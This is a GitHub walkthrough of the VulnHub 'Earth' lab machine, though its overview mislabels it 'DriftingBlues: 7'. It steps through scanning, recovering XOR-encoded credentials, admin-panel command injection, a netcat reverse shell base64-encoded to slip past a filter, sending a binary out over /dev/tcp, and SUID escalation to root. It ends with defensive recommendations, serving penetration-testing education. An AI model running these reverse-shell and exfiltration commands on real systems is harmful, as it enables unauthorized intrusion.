# 🔐Vulnhub-Earth-Walkthrough
  
🎯 This walkthrough demonstrates a structured approach covering enumeration, exploitation, and privilege escalation.


---

## 📌 Overview
- **Machine:** DriftingBlues: 7
- **Platform:** VulnHub
- **Objective:** Gain root access

  
This project demonstrates a complete penetration testing lifecycle, focusing on:
- Deep enumeration
- Credential discovery
- Exploitation chaining
- Achieving root access


---

## 🧠 Methodology
``` mermaid
flowchart LR
A[Reconnaissance] --> B[Enumeration]
B --> C[Credential Discovery]
C --> D[Exploitation]
D --> E[Privilege Escalation]
E --> F[Root Access]
```

---

## 🌐 Network Discovery
We will start with first discovering our victim IP address with the help of net discover tool.

**COMMAND:** sudo netdiscover -r <IP_RANGE>

<img width="846" height="411" alt="image" src="https://github.com/user-attachments/assets/00245370-0e65-40bf-a386-ce654c5666d6" />


**TARGET IP:** 192.168.56.107

**Why was this done:**
- Identify active hosts on the network.
- Detect the vulnerable vm before scanning.

---

## 🔎 Port Scanning
Once we have found out the IP address now we will use nmap to scan all open ports and services running on this machine.

**COMMAND:** sudo nmap -Pn -sS -sV <TARGET_IP>

<img width="917" height="380" alt="image" src="https://github.com/user-attachments/assets/c1798479-e8cb-44a5-9d4d-c2e9f48e663b" />

| Port | Service       |
| ---- | ------------- |
| 22   | SSH           |
| 80   | HTTP          |
| 443  | HTTPS         |

---

## 🧪 Enumeration
**🌍 Web Enumeration**

Accessing the HTTPS service revealed a self-signed certificate containing:
- earth.local
- terratest.earth.local

<img width="857" height="413" alt="image" src="https://github.com/user-attachments/assets/dde6d042-dcf6-43f2-ae87-d46bc9d368b6" />

<img width="845" height="406" alt="image" src="https://github.com/user-attachments/assets/efd84ced-c1c0-4298-9ea0-94d531d8c379" />

**Why this matter:**

SSL certificates often leak:
- Internal Domains
- Subdomains
- Infrastructure naming conventions


**UPDATE HOST FILE**

Now I will update my Kali machine host file with this two DNS so I can access it.

**COMMAND:** sudo nano /etc/hosts

<img width="842" height="410" alt="image" src="https://github.com/user-attachments/assets/ffc1f916-4e55-4f82-9afd-1cb32ad39908" />


**ADDEDD:**
- earth.local
- terratest.earth.local


<img width="842" height="410" alt="image" src="https://github.com/user-attachments/assets/003c45ed-f7c0-4477-9905-2e560ef3f163" />

---

## 📂Directory Enumeration

Enumerating HTTP service

**COMMAND:** gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/directory-medium-2.3.txt

**Findings:** /admin

<img width="840" height="411" alt="image" src="https://github.com/user-attachments/assets/6de78945-2696-450d-bdbd-3d2519f2d796" />

**Why was this important:**

Administrative portals are high-value targets that may:
- Expose login functionally
- Leak sensitive features
- Allow remote code execution


So I access to /admin directory and I found out admin login panel.

<img width="846" height="323" alt="image" src="https://github.com/user-attachments/assets/5a067eec-05c5-46ed-8792-ca0a4f52067f" />

<img width="843" height="358" alt="image" src="https://github.com/user-attachments/assets/7c82023a-2b46-49b8-9a5e-904d0bd671e6" />

Enumerating HTTPS service

**COMMAND:** gobuster dir -u https://terratest.earth.local -k -w /usr/share/wordlists/dirb/directory-medium-2.3.txt

**Findings:** robots.txt

<img width="847" height="411" alt="image" src="https://github.com/user-attachments/assets/1cb11642-5c1f-417d-b1f0-d65e8a403079" />

After opening robots.txt I found interesting entry which is /testingnotes.txt

**Why this matters:**

Misconfigured robots.txt files can unintentionally expose:
- Hidden directories
- Developer notes
- Sensitive testing data

---

## 📜Information Disclosure

Accessing testingnotes.txt

<img width="846" height="398" alt="image" src="https://github.com/user-attachments/assets/73e39800-72e7-4eb8-8157-53af7cb46971" />

**Information Leaked:**
- XOR encryption used
- Username: terra
- Encryption key stored in testdata.txt

---

## 🔓Credential Recovery

Using Hex decoding and XOR encryption key from testdata.txt.

Recovered Credentials:
- Username: terra
- Password: earthclimatechangebad4humans

<img width="843" height="430" alt="image" src="https://github.com/user-attachments/assets/f03ebd80-1639-470b-ae4f-b6efe2cf67a2" />

---

## 🔐Authentication and Command Execution
Now I have the credentials for admin login panel so I will use this credentials to login.

Successfully authenticated using recovered credentials.

<img width="847" height="371" alt="image" src="https://github.com/user-attachments/assets/b5533350-35be-48ef-bc57-8a309409966e" />

**Command Injection Capability**

The admin panel allowed arbitary command execution.

**Why this is critical:**

Unsanitized command execution can directly lead to :
- Remote code execution
- Reverse shells
- Full server compromise

---

## 💣Reverse Shell
Now I will use netcat tool to connect to our target machine. Use the command below in CLI comand window:

**COMMAND:** nc -e /bin/bash 192.168.56.102 4444

Before running the command in CLI Command window first start listening on port 4444 on your Kali Machine.

**COMMAND:** nc -lvp 4444

<img width="840" height="407" alt="image" src="https://github.com/user-attachments/assets/9b38855c-6dc3-43ce-af1a-015d5b6ce507" />

<img width="846" height="398" alt="image" src="https://github.com/user-attachments/assets/4a354223-1761-4139-98d2-bef218fd63a3" />

So after running CLI command I found that remote connection are forbidden so I need to encrypted the netcat command and force to decrypt it.

To encrypt use command below:

**COMMAND:** echo 'nc -e /bin/bash 192.168.56.102 4444' | base64

<img width="852" height="415" alt="image" src="https://github.com/user-attachments/assets/059f0994-bf01-49c4-94b2-b698559ad1d2" />

Now copy the string into CLI command and decryt it.

**COMMAND:** echo 'put_your_encoded_string_here' | base64 -d | bash

As you can see I have connected to our target machine with help of netcat

<img width="848" height="407" alt="image" src="https://github.com/user-attachments/assets/673da422-0d41-43e5-b10a-b73e4330a050" />

---

## 🧑‍💻 Shell Stablization
Run this python command for stabilization of shell:

**COMMAND:** python3 -c 'import pty; pty.spawn("/bin/bash")'

**Why was this done:** 

A stable shell allows:
- Better Command Interaction
- Sudo usage
- Interactive Shell functionality

---

## 🚀 Previlege Escalation
**SUID Enumeration**
Now I will try to find any weak file permission of our target machine.

**COMMAND:** find / -perm -u=s -type f 2>/dev/null

**Found Interesting binary:** /usr/bin/reset_root

<img width="845" height="413" alt="image" src="https://github.com/user-attachments/assets/6f384089-422d-4be7-a18b-4ea47292ad52" />

Now I will try to check the file info.

**COMMAND:** file /usr/bin/reset_root

**COMMAND:** reset_root

**Result:** Check Failed

Suspicious custom SUID binaries are often exploitable.

<img width="845" height="410" alt="image" src="https://github.com/user-attachments/assets/edb6bf38-6ee9-4c2d-8cdb-15a287aa4e32" />

I found out that the file is not executable as I am encountering an error.

---

## 🔬 Binary Extraction and Analysis
I will first send this file to our Kali machine, to do so start netcat listener on your Kali machine.

**COMMAND:**  nc -lvnp 3333 > reset_root (In your Kali Machine)

On other netcat session on target machine run this command to send the file to Kali machine.

**COMMAND:** cat /usr/bin/reset_root > /dev/tcp/192.168.56.102/3333(In your target Machine)

<img width="847" height="407" alt="image" src="https://github.com/user-attachments/assets/8ab94c1b-a0cf-4509-ac17-8b6a298db343" />

Now once the file is in our Kali machine I will use ltrace tool to analyze the file so first I need to use chmod command to add an execute command to reset_root file.

**COMMAND:** chmod +x ./reset_root 

Then run ltrace tool.

**COMMAND:**  ltrace ./reset_root

<img width="852" height="398" alt="image" src="https://github.com/user-attachments/assets/7a768604-c6aa-491e-aae1-d5113149b74b" />

**Findings:**
3 files were missing on target machine thats the reason the file was not executing.
- /dev/shm/kHgTFI5G
- /dev/shm/Zw7bV9U5
- /tmp/kcM0Wewe

---

## 🔓 Triggering Previlige Escalation
Now I will add this file to target machine using touch command.

**COMMAND:** touch <filename> 

<img width="296" height="68" alt="image" src="https://github.com/user-attachments/assets/5620c448-f350-43f6-ab76-fde2dd184e85" />

Now after adding this file we will run the reset_root file.

<img width="317" height="65" alt="image" src="https://github.com/user-attachments/assets/2e281845-32e4-4914-bc7c-9315f9a13db2" />

**Root password was reset successfull**

---

## 👑 Root Access
The root password was successfully reset to Earth. Lets log into root account.

**COMMAND:** su root

Successfully login as root. To retrive root flag go to root directory and open with cat command.

**COMMAND:** cat /root/root_flag.txt

Root compromise successfully.

---

## ⚔️ Mitre Attack Mapping
| Phase                | Technique                             |
| -------------------- | ------------------------------------- |
| Reconnaissance       | Active Scanning                       |
| Discovery            | File and Directory Discovery          |
| Credential Access    | Credentials from Password Stores      |
| Initial Access       | Valid Accounts                        |
| Execution            | Command and Scripting Interpreter     |
| Persistence          | Account Manipulation                  |
| Privilege Escalation | Exploitation for Privilege Escalation |

---

## 🧠 Key Learnings
-  SSL certificates can leak valuable infrastructure information
-  robots.txt may expose sensitive development files
-  Weak encryption practices can lead to credential compromise
-  Unsanitized command execution results in RCE
-  Custom SUID binaries should always be analyzed carefully

---

## 🛡️Security Recommendation
- Restrict public access to sensitive files
- Avoid exposing encryption keys publicly
- Validate and sanitize command execution input
- Replace self-signed certificates with trusted CA certificates
- Audit custom SUID binaries for insecure logic

---

## 🛠️ Tools Used
- Nmap
- Gobuster
- Cyberchef
- Netcat
- Ltrace

---

## 👨‍💻 Author
**Jeet Bandhara**
- https://github.com/Jeet-Bandhara?utm_source=chatgpt.com
- https://medium.com/@bndjeet11

---
